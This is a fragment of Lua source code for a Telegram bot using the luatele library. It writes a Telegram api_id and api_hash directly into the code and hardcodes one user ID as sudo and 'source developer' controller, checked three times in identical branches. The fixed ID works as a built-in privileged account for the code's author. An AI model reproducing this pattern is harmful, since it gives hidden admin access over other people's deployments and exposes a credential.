...
LuaTele = luatele.set_config{api_id=24535068,api_hash='6298b24407c01e0f60c907329ed09df5',session_name=Revor,token=Token}
...
ControllerAll = false
local ListSudos ={Sudo_Id,6394195620}  
...
if tonumber(msg.sender.user_id) == 6394195620 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 6394195620 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 6394195620 then
